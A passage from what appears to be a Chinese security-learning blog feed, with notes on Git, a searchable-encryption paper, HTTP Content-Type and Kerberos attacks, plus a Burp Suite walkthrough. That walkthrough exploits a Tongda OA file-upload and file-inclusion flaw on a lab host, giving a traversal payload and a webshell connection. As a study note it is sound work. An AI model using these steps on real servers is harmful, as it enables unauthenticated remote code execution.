[remote rejected] main -&gt; main (permission denied)</span><br><span class="line">error: failed to push some refs to &#x27;https://github.com/Thunderinmoonlight/diSE.git&#x27;</span><br></pre></td></tr></table></figure><p>切换账号信息</p><p><code>git config --global user.name &quot;xxx&quot; //切换用户名</code><br><code>git config --global user.email &quot;xxx&quot; //切换邮箱</code><br><code>git config user.name //查看用户名</code></p><p>配置凭据以使用完整的存储库路径(而不是仅使用默认设置-域)</p><p><code>git config --global credential.useHttpPath true</code></p><p>之后出现的弹窗按要求操作即可完成push</p><h1>4. git 回滚操作</h1><p><code>git log  //查看提交历史，找出要回滚到的commit-id</code><br><code>git reset --hard commit-id</code>  或者  <code>git reset --hard HEAD~1  //将最近1次的提交回滚</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--hard      清空所有修改,删除本地数据</span><br><span class="line">--soft      将之前提交的内容恢复到暂存区,不会修改本地文件</span><br><span class="line">--mixed     将之前提交的内容恢复到未暂存状态,不会修改本地文件 (默认)</span><br></pre></td></tr></table></figure><p>此时本地代码落后于远程代码，如果需要将回滚后的本地代码Push到远程代码仓，需要使用–force以强制Push到远程代码仓<br><code>git push --force  </code></p><blockquote><p>其他的用到再做笔记</p></blockquote><hr><h1>参考文章：</h1><p><a href="https://blog.csdn.net/jarvan5/article/details/111387361">https://blog.csdn.net/jarvan5/article/details/111387361</a></p><p><a href="https://blog.csdn.net/QH_JAVA/article/details/77969010">https://blog.csdn.net/QH_JAVA/article/details/77969010</a></p><p><a href="https://blog.csdn.net/qq_34821328/article/details/115126422">https://blog.csdn.net/qq_34821328/article/details/115126422</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>论文学习(Efficient Attribute-Based Searchable Encryption on the Cloud Storage)</title>
      <link href="/2023/01/31/Efficient-Attribute-Based-Searchable-Encryption-on-the-Cloud-Storage/"/>
      <url>/2023/01/31/Efficient-Attribute-Based-Searchable-Encryption-on-the-Cloud-Storage/</url>
      
        <content type="html"><![CDATA[<p>分析一下这篇论文提出的算法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Guo W F, Dong X L, Cao Z F, et al. Efficient attribute-based searchable encryption on cloud storage[C]//Journal of physics: Conference series. IOP Publishing, 2018, 1087(5): 052001.</span><br></pre></td></tr></table></figure><h1>3.3 Constructions</h1><p>In our scheme, we use inverted index structure as introduced above and implement searchable encryption with AND gate as access control. The scheme consists of 5 main algorithms. We introduce them in detail as below:</p><h2 id="Init">Init</h2><p>We suppose all the attributes are included in set $U=\lbrace attr_1,attr_2,···,attr_n \rbrace$, where n is the size of $U$. For each attribute $attr_i(1 \le i \le n)$, there has 2 values $v_i$ and $\neg v_i$. If the attributes set $Attr$ of one data user include attribute $attr_i(1 \le i \le n)$, the value of $attr_i$ is $v_i$ and the value of $attr_i$ is $\neg v_i$ if $attr_i$ is not in $Attr$. To formalize the description of attributes, we adopt the value of attribute to represent whether user’s set contains this attribute.</p><h3 id="分析：">分析：</h3><p>该段用于初始化用户属性集合，将用户总体属性集合$U=\lbrace attr_1, attr_2, ··· , attr_n \rbrace$中存在的属性置为$v_i$，而不存在的属性置为$\neg v_i$，举个例子就是用户$A$的属性集合为$U=\lbrace v_1, \neg v_2, ··· , v_n \rbrace$。</p><hr><h2 id="Setup">Setup</h2><p>Given a bilinear group $e : G \times G \to G_T$ , $p$ as prime order of $G$ and $G_T$ , and $H : {\lbrace 0, 1 \rbrace}^* \to Z_p$ as an one-way hash function, randomly select three numbers $a, b, c \gets Z_p$, a set $\lbrace r_1, r_2, · · · , r_{2n}\rbrace \gets Z_p$ and a set $\lbrace x_1, x_2, · · · , x_{2n} \rbrace \gets G$. Set $u_i = g ^ {-r_i}$ and $y_i = e(x_i, g)$, where $1 \le i \le 2n$. Then, output the public key $pk = (g, g^a, g^b, g^c, (u_i, y_i)|1 \le i \le 2n)$ and the master key $msk = (a, b, c, (r_i, x_i)|1 \le i \le 2n)$.</p><h3 id="分析：-v2">分析：</h3><p>这一步是初始化公钥$pk$和主密钥$msk$。双线性映射定义了两个素数p阶群乘法循环群$G$，$G_T$，循环群的意思是，群$G$中的每一个元素都是$G$中某一个固定元素q的乘方。$e : G \times G \to G_T$表示分别从循环群$G$中提取元素，并进行某种运算可以得到$G_T$中的元素，这里的e就是映射算法。$H : {\lbrace 0, 1 \rbrace}^* \to Z_p$，即一个散列函数，它将有限长度的二进制字符串作为输入，并输出素数p阶循环群的一个元素。从 $Z_p$ 群和 $G$ 群中随机挑选三个元素$a,b,c$和两个集合$\lbrace r_1, r_2, · · · , r_{2n}\rbrace, \lbrace x_1, x_2, · · · , x_{2n} \rbrace$，集合$u_i = g ^ {-r_i}$，集合$y_i = e(x_i, g)$，其中，$g$ 是$G$群中的随机元素，综上构成公钥$pk = (g, g^a, g^b, g^c, (u_i, y_i)|1 \le i \le 2n)$ 和主密钥 $msk = (a, b, c, (r_i, x_i)|1 \le i \le 2n)$。</p><hr><h2 id="Enc">Enc</h2><div>Choose random $t_1, t_2 \in Z_p$. Suppose the access policy structure $S = \bigwedge_{v_i \in U} v'_i $, where $v'_i = v_i$ or $\neg v_i$. Set  $u_i' = u_i $  if $v_i' = v_i$, $u_i' = u_{i+n}$ otherwise. Compute $u_{gate} = g^{t_2} \prod_{i=1}^n{u'_i} $. For each keyword $w \in WD$, then set $W' = g^{ct_1} $, $W = g^{a(t_1+t_2)}g^{bH(w)t_1} $, and encrypt files $F$ which associate with the keyword $w$ with some symmetric encryption algorithm into $cphF$ . Obviously, $cphW = (W', W, u_{gate})$. Then, the whole $cph = (cphW, cphF)$ as the result of encryption. </div><h3 id="分析：-v3">分析：</h3><div>这一步是加密索引。从$Z_p$群中选取两个随机数$t_1,t_2$。设置访问策略$S$，设置集合$u'_i$的值（如果$v'_i=v_i$，那么 $u'_i = u_i$，否则$u'_i = u_{i+n}$），根据$u_{gate} = g^{t_2} \prod_{i=1}^n{u'_i}$ 来计算$u_{gate}$，根据索引$w,t_1,t_2,g,a,b$ 来计算 $W' = g^{ct_1} $ 和 $W = g^{a(t_1+t_2)}g^{bH(w)t_1}$。与索引对应的文件通过对称密码进行加密，密文为$cphF$，所以整体密文为$cphW =  (cphW, cphF) = ((W', W, u_{gate}),cphF)$。</div><hr><h2 id="KeyGen">KeyGen</h2><div>At First, we set $v = g^{ac}$. For each attribute $v_i^*$ in data user's attribute collection, set $y_i^* = y_i$ if $v_i^* = v_i$, $y_i^* = y_{i+n}$ otherwise. Similarly, compute $\sigma_i^* = x_i v^{r_i}$ if $v_i^* = v_i$, $\sigma_i^* = x_{i+n} v^{r_{i+n}}$ otherwise. Set $\sigma_{user} = \prod^n_{i=1} \sigma_i^*$ Then, the secret key $sk = (y_{user} = \prod^n_{i=1} y_i^*, < v, \sigma_{user} >)$. </div><h3 id="分析：-v4">分析：</h3><div>这一步是关于文件搜索者生成自身私钥的步骤。自定义$v = g^{ac}$。对于文件搜索者自身拥有的属性，如果$v_i^* = v_i$，那么$y_i^* = y_i$，$\sigma_i^* = x_i v^{r_i}$，否则就 $y_i^* = y_{i+n}$，$\sigma_i^* = x_{i+n} v^{r_{i+n}}$。根据$\sigma_{user} = \prod^n_{i=1} \sigma_i^*$来计算$\sigma_{user}$，最后得出文件搜索者的私钥$sk = (y_{user} = \prod^n_{i=1} y_i^*, < v, \sigma_{user} >)$。</div><hr><h2 id="TokenGen">TokenGen</h2><div>Select $s \gets Zp$. To generate the search token for keyword $w$, compute $tok1 = (g^ag^{bH(w)})^s$，$tok2 = g^{cs}$. Therefore, the search token $tok = (y^s_{user}, < v^s, \sigma^s_{user} >, tok1, tok2)$.</div><h3 id="分析：-v5">分析：</h3><div>这一步是为关键词创建 $token$ 。从 $Z_p$ 群中选取一个元素 $s$ ，计算 $tok1=(g^ag^{bH(w)})^s$ ,$tok2 = g^{cs}$，生成最终的$token$，即$tok = (y^s_{user}, < v^s, \sigma^s_{user} >, tok1, tok2)$。</div><hr><h2 id="Search">Search</h2><div>At first, compute $E = \frac{e(u_{gate},v^s)e(\sigma^s_{user},g)}{y^s_{user}} $. If user's attributes satisfy the access policy according to the ciphertext, $E = e(g, g)^{acst2}$ and $e(W', tok1)E = e(W, tok2)$ holds. </div><h3 id="分析：-v6">分析：</h3><div>执行搜索操作。先计算 $E = \frac{e(u_{gate},v^s)e(\sigma^s_{user},g)}{y^s_{user}} $，如果用户属性满足访问策略，则$E = e(g, g)^{acst_2}$ 和 $e(W', tok1)E = e(W, tok2)$成立。</div><hr><p>According to the above, the search token $tok$ can match with the $cphW$ in the ciphertext $cph$, if the attributes of data user can satisfy the access policy used for encrypting the keyword. The $cphF$ in cph should be downloaded afterwards and returned to the data user.</p><hr><p><strong>ps</strong>: Hexo中编写数学公式时，对符号 <strong>’</strong> 的支持不好，会导致转化为html中的公式无法解析，进而导致页面混乱。</p>]]></content>
      
      
      <categories>
          
          <category> 可搜索加密 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>学习HTTP请求包中的Content-Type参数</title>
      <link href="/2023/01/26/Learn-Content-Type-parameter/"/>
      <url>/2023/01/26/Learn-Content-Type-parameter/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><p>HTTP 协议规定 POST 提交的数据必须放在消息主体（entity-body）中，但协议并没有规定数据必须使用什么编码方式。实际上，开发者完全可以自己决定消息主体的格式，只要最后发送的 HTTP 请求满足上面的格式就可以。但是，数据发送出去，还要服务端解析成功才有意义。一般服务端语言如 php、python 等，以及它们的 framework，都内置了自动解析常见数据格式的功能。服务端通常是根据请求头（headers）中的 Content-Type 字段来获知请求中的消息主体是用何种方式编码，再对主体进行解析。所以说到 POST 提交数据方案，包含了 Content-Type 和消息主体编码方式两部分。</p><h1>1. application/x-www-form-urlencoded</h1><p>application/x-www-urlencoded是浏览器默认的编码格式，浏览器的原生 form 表单，如果不设置 enctype 属性，那么最终就会以 application/x-www-form-urlencoded 方式提交数据。请求如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http: //www .example.com HTTP /1 .1</span><br><span class="line">Content-Type: application /x-www-form-urlencoded ;charset=utf-8</span><br><span class="line"></span><br><span class="line">title= test &amp;sub%5B%5D=1&amp;sub%5B%5D=2&amp;sub%5B%5D=3</span><br></pre></td></tr></table></figure><p>服务器知道参数用符号&amp;间隔，如果参数值中需要&amp;，则必须对其进行编码。编码格式就是application/x-www-form-urlencoded（将键值对的参数用&amp;连接起来，如果有空格，将空格转换为+加号；有特殊符号，将特殊符号转换为ASCII HEX值）。</p><p>很多时候，我们用 Ajax 提交数据时，也是使用这种方式。例如 JQuery 和 QWrap 的 Ajax，Content-Type 默认值都是「application/x-www-form-urlencoded;charset=utf-8。</p><h1>2. multipart/form-data</h1><p>使用表单上传文件时，必须让 form 的 enctyped 等于这个值。请求如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http: //www .example.com HTTP /1 .1</span><br><span class="line">Content-Type:multipart /form-data ; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name= &quot;text&quot;</span><br><span class="line">title</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA</span><br><span class="line">Content-Disposition: form-data; name= &quot;file&quot; ; filename= &quot;chrome.png&quot;</span><br><span class="line">Content-Type: image /png</span><br><span class="line"></span><br><span class="line">PNG ... content of chrome.png ...</span><br><span class="line">------WebKitFormBoundaryrGKCBY7qhFd3TrwA--</span><br></pre></td></tr></table></figure><p>首先生成了一个 boundary 用于分割不同的字段，为了避免与正文内容重复，boundary 很长很复杂。Content-Type 里指明了数据是以 mutipart/form-data 来编码，以及本次请求的 boundary 是什么。消息主体里按照字段个数又分为多个结构类似的部分，每部分都是以 --boundary 开始，紧接着内容描述信息，最后是字段具体内容（文本或二进制）。如果传输的是文件，还要包含文件名和文件类型信息。消息主体最后以 –boundary– 标示结束。这种方式一般用来上传文件，各大服务端语言对它也有着良好的支持。</p><h1>3. application/json</h1><p>随着 json 规范的越来越流行，并且对浏览器支持程度原来越好，许多开发人员在请求头中加入 content-type: application/jsonapplication/json ，这样做可以方便的提交复杂的结构化数据。它告诉服务器请求的主体内容是 json 格式的字符串，服务器端会对json字符串进行解析，json 格式要支持比键值对复杂得多的结构化数据。这种方式的好处就是前端人员不需要关心数据结构的复杂度，只需要标准的json格式就能提交成功。当在 axios 中请求参数为普通对象时，POST 请求默认发送的是 application/json 格式的数据。请求如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST http: //www .example.com HTTP /1 .1</span><br><span class="line">Content-Type: application /json ;charset=utf-8</span><br><span class="line"></span><br><span class="line">&#123; &quot;title&quot; : &quot;test&quot; , &quot;sub&quot; :[1,2,3]&#125;</span><br></pre></td></tr></table></figure><h1>4. text/xml</h1><p>XML-RPC 协议是一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范。典型的 XML-RPC 请求是这样的：请求如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http: //www .example.com HTTP /1 .1</span><br><span class="line">Content-Type: text /xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version= &quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">     &lt;methodName&gt;examples.getStateName&lt; /methodName &gt;</span><br><span class="line">     &lt;params&gt;</span><br><span class="line">         &lt;param&gt;</span><br><span class="line">             &lt;value&gt;&lt;i4&gt;41&lt; /i4 &gt;&lt; /value &gt;</span><br><span class="line">         &lt; /param &gt;</span><br><span class="line">     &lt; /params &gt;</span><br><span class="line">&lt; /methodCall &gt;</span><br></pre></td></tr></table></figure><p>XML-RPC 协议简单、功能够用，各种语言的实现都有。它的使用也很广泛，如 WordPress 的 XML-RPC Api，搜索引擎的 ping 服务等等。JavaScript 中，也有现成的库支持以这种方式进行数据交互，能很好的支持已有的 XML-RPC 服务。</p><p>如果 MIME 用户代理或 Web 用户代理不支持这个媒体类型，会将其视为 text/plain，当做纯文本处理。text/xml 媒体类型限制了 XML 实体中可用的编码类型（例如此时支持 UTF-8 但不支持 UTF-16，因为使用 UTF-16 编码的文本在处理 CR，LF 和 NUL 会导致异常转换）。text/xml 实体在 XML 头指定编码格式无效，必须在 HTTP 头部的 Content-Type: 中指定才会生效（例如 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code> 无法设置字符集，<code>Content-Type: text/xml; charset=&quot;utf-8&quot;</code> 则可以）。没有设置字符集时默认使用 “us-ascii” 字符集。</p><hr><p>参考文章：<br><a href="https://blog.csdn.net/xiao__jia__jia/article/details/79357274">https://blog.csdn.net/xiao__jia__jia/article/details/79357274</a><br><a href="https://blog.csdn.net/weixin_40599109/article/details/113614103">https://blog.csdn.net/weixin_40599109/article/details/113614103</a><br><a href="https://www.jb51.net/web/804320.html">https://www.jb51.net/web/804320.html</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用Burpsuit的Repeater模块构造请求数据包</title>
      <link href="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/"/>
      <url>/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><p>这里以通达OA 2016版的一个文件上传+文件包含漏洞为例，详细说明如何利用 Burpsuit 的 Repeater 模块构造请求数据包</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/1.png"></div><p>通达OA是由北京通达信科科技有限公司开发的一款办公系统，攻击者可在未授权的情况下可上传图片木马文件，之后通过精心构造的请求进行文件包含，实现远程命令执行，且攻击者无须登陆认证即可完成攻击</p><p>包含漏洞的两个文件：</p><ol><li>文件上传：<code>webroot\ispirit\im\upload.php</code></li><li>文件包含：<code>webroot\ispirit\interface\gateway.php</code></li></ol><p>首先在 Reaperter 模块复制目标URL：<code>http://192.168.227.129/ispirit/im/upload.php</code>，右键点击<code>Paste URL as request</code></p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/2.png"></div><p>继续右键点击<code>Change request method</code>，将GET方法改为POST方法</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/3.png"></div><p>Send之后会显示<code>-ERR 用户未登录</code></p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/4.png"></div><p>添加以下参数</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/5.png"></div><p>右键点击<code>Change body encoding</code>，将 Content-Type 修改为<code>Content-Type:multipart/form-data; boundary=XXX</code></p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/6.png"></div><p><strong>PS</strong>：关于不同的 Content-Type，可以查看另一篇文章 <a href="../Learn-Content-Type-parameter/index.html">学习HTTP请求包中的Content-Type参数</a></p><p>在POST数据后面后面继续添加要上传的文件内容，Send后成功返回OK</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/7.png"></div><p>成功上传图片。通达OA默认上传位置：<code>myoa/attach/im</code>，则上面的完整路劲为:<code>myoa/attach/im/2301/1277314394.jpg</code></p><p>复制URL：<code>http://192.168.227.129/ispirit/interface/gateway.php</code> ,构造POST请求包，进行文件包含操作，解析出一句话木马，payload为<code>json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2301/1277314394.jpg&quot;&#125;</code>，成功解析</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/8.png"></div><p>解析后的木马文件的位置为<code>http://192.168.227.129/ispirit/interface/bbskali.php</code>，蚁剑连接</p><div class="center"><img src="/2023/01/26/Construct-the-packets-by-using-repeater-module-of-Burpsuit/9.png"></div><hr><p><strong>参考文章</strong>：</p><p><a href="https://www.adminxe.com/1003.html">https://www.adminxe.com/1003.html</a></p><p><a href="https://cloud.tencent.com/developer/article/1921368">https://cloud.tencent.com/developer/article/1921368</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14726217.html">https://www.cnblogs.com/Article-kelp/p/14726217.html</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos协议学习</title>
      <link href="/2022/11/01/Kerberos-protocol-learning/"/>
      <url>/2022/11/01/Kerberos-protocol-learning/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. 前言</h1><p>为什么要有Kerberos这样一个中央认证机制？</p><p>假设有A，B，C三个服务器，分别提供不同的服务，user要访问ABC都需要输入用户名密码，但是ABC没必要都存一份user的密码，所以就衍生出一个中央服务器D来专门存储用户名密码；如果user通过了D的认证，那就是合法的身份，就可以使用ABC任何一个服务，所以user需要告诉ABC它通过了D的认证。如何证明这个事情，以及信息在网络传输过程如何防止被截获篡改而假冒等等，解决这些问题就靠kerberos。</p><p>Kerberos是Windows域首选的一种认证协议，优于NTLM认证机制。虽然Kerberos认证机制较为复杂，但红队、渗透测试人员以及实际攻击者经常会用到该协议。理解Kerberos的工作原理非常重要，这样才能理解针对Kerberos的潜在攻击方式，澄清攻击者如何利用该协议攻击域环境。</p><h1>2. 概述</h1><p>Kerberos简单来说就是一个用于安全认证第三方协议，它采用了传统的共享密钥的方式，实现了在网络环境不一定保证安全的环境下，client和server之间的通信，适用于client/server模型，由MIT开发和实现。</p><p>Kerberos并不要求通信双方所在的网络环境是安全的，即使通信过程中数据被截取或者篡改依然不会影响它的正常工作，它提供的认证是双向的，不仅能保证Server不被错误的Client使用，同时也能保证Client不使用错误的Server。同时Kerberos又严重依赖于时间，时间戳也是Kerberos用来保证通信安全的重要手段，这个一般通过通信双方同时访问同一个时间服务器来实现。Kerberos也能达到单点登录的效果，即当Client通过了Kerberos server的认证后，便可以访问多个Real Server。</p><h1>3. 原理</h1><h2 id="3-1-名词解释">3.1. 名词解释</h2><div class="center"><table><thead><tr><th>名词</th><th>解释</th></tr></thead><tbody><tr><td>DC（Domain Controller）</td><td>域控制器，一台计算机实现用户、计算机的统一管理</td></tr><tr><td>KDC（key distribution center）</td><td>是一个网络服务，提供ticket和临时会话密钥，是 Kerberos 的核心组件，主要由三个部分组成：<br> - Kerberos Database: 包含了一个 Realm 中所有的 principal、密码与其他信息。（默认：Berkeley DB）<br> - Authentication Service(AS): 进行用户信息认证，为客户端提供 Ticket Granting Tickets(TGT)<br> - Ticket Granting Service(TGS): 验证 TGT 与 Authenticator，为客户端提供 Service Tickets</td></tr><tr><td>AS（Authentication Server）</td><td>认证服务器</td></tr><tr><td>TGS（Ticket Grantion Server）</td><td>票据授权服务器</td></tr><tr><td>TGT（Ticket-Granting-Ticket）</td><td>票据授予票据</td></tr><tr><td>TGS（Ticket-Granting Service）</td><td>票据授予服务</td></tr><tr><td>principal</td><td>大致可以认为是 Kerberos 世界的用户名，用于标识身份。principal 主要由三部分构成：primary，instance(可选) 和 realm。包含 instance 的principal，一般会作为server端的principal，如：NameNode，HiverServer2，Presto Coordinator等；不含有 instance 的principal，一般会作为客户端的principal，用于身份认证</td></tr><tr><td>realm name</td><td>包含KDC和许多客户端的Kerberos网络，类似于域，俗称为领域；也是principal的一个“容器”或者“命名空间”。相对应的，principal的命名规则是&quot;what_name_you_like@realm&quot;。在kerberos，大家都约定俗成用大写来命名realm，比如“<a href="http://EXAMPLE.COM">EXAMPLE.COM</a>”</td></tr><tr><td>password</td><td>某个用户的密码，对应于kerberos中的master_key。password可以存在一个keytab文件中。所以kerberos中需要使用密码的场景都可以用一个keytab作为输入</td></tr><tr><td>keytab</td><td>keytab是包含principals和加密principal key的文件。keytab文件对于每个host是唯一的，因为key中包含hostname。keytab文件用于不需要人工交互和保存纯文本密码，实现到kerberos上验证一个主机上的principal。因为服务器上可以访问keytab文件即可以以principal的身份通过kerberos的认证，所以，keytab文件应该被妥善保存，应该只有少数的用户可以访问</td></tr><tr><td>credential</td><td>credential是“证明某个人确定是他自己/某一种行为的确可以发生”的凭据。在不同的使用场景下，credential的具体含义也略有不同：对于某个principal个体而言，他的credential就是他的password；在kerberos认证的环节中，credential就意味着各种各样的ticket</td></tr><tr><td>authenticator</td><td>验证者，是服务器用于验证客户机用户主体的信息。验证者包含用户的主体名称、时间标记和其他数据。与票证不同，验证者只能使用一次，通常在请求访问服务时使用</td></tr><tr><td>Ticket</td><td>一个记录，客户用它来向服务器证明自己的身份，包括服务的主体名称、用户的主体名称、用户主机的ip地址、时间标记、会话密钥、定义票证生命周期的时间戳</td></tr></tbody></table><h2 id="3-2-工作过程分析">3.2. 工作过程分析</h2><p>Client从KDC获取TGT，Client利用获取的TGT向KDC请求其他Service的Ticket（通过获取的session进行访问）。</p><div class="center"><img src="/2022/11/01/Kerberos-protocol-learning/3-2-1.png"></div><p><strong>步骤详解：</strong></p><p><strong>1. 客户端与 Authentication Server，获得TGT</strong></p><p><strong>第一步</strong>，客户端通过kinit USERNAME或其他方式，将客户端ID, 目标HTTP服务ID, 网络地址（可能是多个机器的IP地址列表，如果想在任何机器上使用，则可能为空），以及TGT有效期的寿命等信息发送给 Authentication Server。</p><p><strong>第二步</strong>，Authentication Server 将检查客户端ID是否在KDC数据库中。如果 Authentication Server 检查操作没有异常，那么KDC将随机生成一个 key，用于客户端与 Ticket Granting Server(TGS) 通信。这个Key，一般被称为 TGS Session Key。随后 Authentication Server 将发送两条信息给客户端：其中一条信息被称为TGT，由TGS的密钥加密，客户端无法解密，包含客户端ID, TGS Session Key等信息。另一条信息由客户端密钥加密，客户端可以正常解密，包含目标 HTTP 服务ID，TGS Session Key等信息。</p><p><strong>第三步</strong>，客户端利用本地的密钥解密出第二条信息。如果本地密钥无法解密出信息，那么认证失败。</p><p><strong>2. 客户端与 Ticket Granting Server，获得SGT</strong></p><p>这时候，客户端有了 TGT（由于本地没有TGS的密钥，导致无法解密出其数据）与 TGS Session Key。</p><p><strong>第四步</strong>，客户端将发送两条消息给TGS，一是“无脑”将 AS 发送过来的TGT（由TGS密钥加密）转发给TGS，二是将包含自身信息的Authenticator(由TGS Session Key加密)发送给TGS</p><p><strong>第五步</strong>，TGS 将利用自身的密钥从TGT中解密出TGS Session Key，然后利用TGS Session Key从 Authenticator 中解密出客户端的信息。TGS 解密出所有信息后，将进行身份检查，进行认证：</p><ul><li>将客户端ID与TGT的客户端ID进行比较</li><li>比较来自 Authenticator 的时间戳和TGT的时间戳 (典型的Kerberos系统的容忍度是2分钟，但也可以另行配置)</li><li>检查TGT是否过期</li><li>检查Authenticator是否已经在TGS的缓存中（为了避免重放攻击）</li></ul><p>当所有检查都通过后， TGS 随机生成一个 Key 用于后续客户端与 HTTP 服务交互时进行通信加密使用，即 HTTP Session Key。同样地，TGS 将发送两条信息给客户端: 其中一条是 HTTP Ticket（SGT），由 HTTP 服务的密钥进行加密；另一条则由TGS Session Key加密，包含了客户端信息与时间戳。</p><p><strong>第六步</strong>，客户端将利用TGS Session Key解密出其中一条信息，另一条信息由于是由目标HTTP服务加密，无法解密。</p><p><strong>3. 客户端与 HTTP Server，获得服务</strong></p><p>这时候，客户端有了HTTP Ticket（由于本地没有HTTP服务的密钥，导致无法解密出其数据）与 HTTP Session Key。</p><p><strong>第七步</strong>，客户端将发送两条信息给HTTP服务：一是“无脑”将 AS 发送过来的 HTTP Ticket（由HTTP 密钥加密）转发给目标 http 服务。二是将包含自身信息的Authenticator(由HTTP Session Key加密)发送给 http 服务。</p><p><strong>第八步</strong>，HTTP服务首先利用自身的密钥解密出 HTTP Ticket 的信息，得到 HTTP Session Key；随后，利用HTTP Session Key解密出用户的Authenticator信息。信息解密完成后，HTTP 服务同样需要做一些信息检查：</p><ul><li>将 Authenticator 中的客户端ID与HTTP Ticket中的客户端ID进行比较</li><li>比较来自 Authenticator 的时间戳和 HTTP Ticket 的时间戳 (典型的 Kerberos 系统对差异的容忍度是 2 分钟，但也可以另行配置)</li><li>检查Ticket是否过期</li><li>检查 Authenticator 是否已经在HTTP服务器的缓存中（为了避免重播攻击）</li></ul><p>至此，所有的认证过程通过，客户端即可与远程HTTP服务完成了身份认证，可以进行后续的信息通信。</p><h1>4. 存在漏洞</h1><h2 id="4-1-Kerberoasting">4.1. Kerberoasting</h2><p>当发送TGS时，KDC会使用时间戳+服务账户的密码哈希来加密TGS。由于目标服务通常为计算机控制的某个服务（比如HOST或者CIFS），因此这里会使用主机账户密码哈希。在某些情况下，用户账户也会被创建为“服务账户”，注册为SPN。由于KDC不负责服务的授权工作（该工作由服务自己负责），因此任何用户都可以请求任何服务的TGS。这意味着如果某个用户“服务账户”被注册为SPN，那么任何用户都可以请求该用户对应的TGS，而该TGS使用用户账户密码哈希加密，攻击者可以从票据中提取哈希，离线破解。</p><h2 id="4-2-黄金票据">4.2. 黄金票据</h2><p>当发送TGT时，该票据会使用KRBTGT的账户密码哈希来加密。KRBTGT的密码默认情况下不会被手动设置，因此与主机账户密码一样复杂。当攻击者成功获取KRBTGT密码，伪造TGT时，这种攻击技术称为黄金票据攻击。Mimikatz可以使用KRBTGT密码的RC4哈希来伪造任何用户的票据，并且该过程不需要知道用户密码。</p><div class="center"><img src="/2022/11/01/Kerberos-protocol-learning/4-3-1.png"></div><h2 id="4-3-白银票据">4.3. 白银票据</h2><p>黄金票据对应的是TGT伪造，而白银票据则是TGS伪造。攻击者使用黄金票据时会有安全上的考虑：攻击过程涉及KDC，KDC会发布一个TGT，因此防御方可能会收到警报，捕捉到黄金票据攻击。白银票据更为隐蔽，攻击过程不涉及到KDC。由于这里伪造的是服务票据，因为攻击者需要知道目标服务的密码哈希，而大多数情况下，该哈希对应的是主机账户的密码哈希。对于设置了SPN的服务账户，攻击者也可以针对该SPN生成白银票据。</p><p>举个例子，如果用户名MSSQLServiceAcct创建了一个服务账户，注册了MSSQLSVC主体，那么对应的SPN则为MSSQLSVC/MSSQLServiceAcct。如果攻击者获取了账户的密码哈希（通过Kerberoasting或者其他方法），就可以利用该哈希来伪造针对该SPN的TGS，访问对应的服务（这里为MSSQLSVC）。</p><p>对于某些服务（如CIFS），如果使用了用户账户来创建SPN（如CIFS/Alice），此时攻击者无法使用该用户的密码来构造CIFS对应的白银票据，这是因为用户并不控制该服务的访问权限，这是主机账户负责的工作。</p><div class="center"><img 